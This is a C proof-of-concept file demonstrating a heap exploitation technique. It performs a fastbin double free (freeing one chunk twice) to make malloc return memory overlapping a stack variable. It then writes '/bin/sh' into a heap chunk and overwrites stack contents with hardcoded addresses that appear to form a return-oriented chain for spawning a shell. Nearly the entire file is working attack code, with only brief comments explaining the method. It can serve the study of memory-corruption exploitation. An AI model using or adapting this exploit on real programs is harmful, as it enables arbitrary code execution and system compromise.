/*
Author - Vishvajeet Subhash Patil
Case 2 - When you have no array access in stack (that is no buffer) but you somehow know the address of one stack variable
and therby also an access to it and you can call malloc and free and access those malloc variable then you can effectively create array to access the memory location and execute the shellcode
*/
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
/*Stuff for POC only
*/
typedef unsigned int ui;
//Malloc creation API with limit on size to say only upto fastbins default max of 64 bytes
char* servemalloc(int x)
{
	if (x>64)
	{
		printf("Exceeded your API heap limit\n");
		return NULL;
	}
	return (char*)malloc(x);
}
void delapi(char *x)
{
	if (x==NULL)
	{
		printf("Tried deleting NULL API object");
		exit(1);
	}
	free(x);
}
int accessR(char *x,int y)
{
	if (x==NULL)
	{
		printf("Tried accessing invalid API object\n");
		exit(0);
	}
	else
	{
		return x[y];
	}
}
void accessW(char *x,int y,char z)
{
	if (x==NULL)
	{
		printf("Tried writing to invalid API object\n");
		exit(1);
	}
	else
	{
		x[y] = z;
	}
}
void func()
{
	printf("The start\n");
	unsigned int st_var;
	st_var = 0x10;
	char *A = servemalloc(8);
	char *B = servemalloc(8);
	delapi(A);
	delapi(B);
	delapi(A);
	//Now freelist has A -- B -- A
	char *A1 = malloc(8);
	char *B1 = servemalloc(8);
	//But it can be argued that those two functions are unnecessary if you are providing pointer access but my point is 
	//even without returning pointer one can do this kind of thing if above functions are available
	accessW(B1,0,'/');accessW(B1,1,'b');accessW(B1,2,'i');accessW(B1,3,'n');accessW(B1,4,'/');accessW(B1,5,'s');accessW(B1,6,'h');
	//The below line can be simulated with the resulting value of RHS and then assigning each character with accessW function
	*((ui*)A) = (ui)(((char*)&st_var)-4); //This is according to fastbin structure
	servemalloc(8);
	char *C = servemalloc(8);
	printf ("%p\n",B1);
	//All below activities can be simulated using api functions
	accessW(C,36,'\x10');accessW(C,37,'\xf4');accessW(C,38,'\x06');accessW(C,39,'\x08');
	accessW(C,40,'\x00');accessW(C,41,'\x00');accessW(C,42,'\x00');accessW(C,43,'\x00');
	accessW(C,44,'\x00');accessW(C,45,'\x00');accessW(C,46,'\x00');accessW(C,47,'\x00');
	accessW(C,48,(char)B1);accessW(C,49,(char)((int)B1 >> 8));accessW(C,50,(char)((int)B1 >> 16));accessW(C,51,(char)((int)B1 >> 24));
	//11 times
	accessW(C,52,'\x3f');accessW(C,53,'\xac');accessW(C,54,'\x07');accessW(C,55,'\x08');
	accessW(C,56,'\x3f');accessW(C,57,'\xac');accessW(C,58,'\x07');accessW(C,59,'\x08');
	accessW(C,60,'\x3f');accessW(C,61,'\xac');accessW(C,62,'\x07');accessW(C,63,'\x08');
	accessW(C,64,'\x3f');accessW(C,65,'\xac');accessW(C,66,'\x07');accessW(C,67,'\x08');
	accessW(C,68,'\x3f');accessW(C,69,'\xac');accessW(C,70,'\x07');accessW(C,71,'\x08');
	accessW(C,72,'\x3f');accessW(C,73,'\xac');accessW(C,74,'\x07');accessW(C,75,'\x08');
	accessW(C,76,'\x3f');accessW(C,77,'\xac');accessW(C,78,'\x07');accessW(C,79,'\x08');
	accessW(C,80,'\x3f');accessW(C,81,'\xac');accessW(C,82,'\x07');accessW(C,83,'\x08');
	accessW(C,84,'\x3f');accessW(C,85,'\xac');accessW(C,86,'\x07');accessW(C,87,'\x08');
	accessW(C,88,'\x3f');accessW(C,89,'\xac');accessW(C,90,'\x07');accessW(C,91,'\x08');
	accessW(C,92,'\x3f');accessW(C,93,'\xac');accessW(C,94,'\x07');accessW(C,95,'\x08');
	accessW(C,96,'\x55');accessW(C,97,'\xd0');accessW(C,98,'\x06');accessW(C,99,'\x08');
}
int main()
{
	func();
	return 0;
}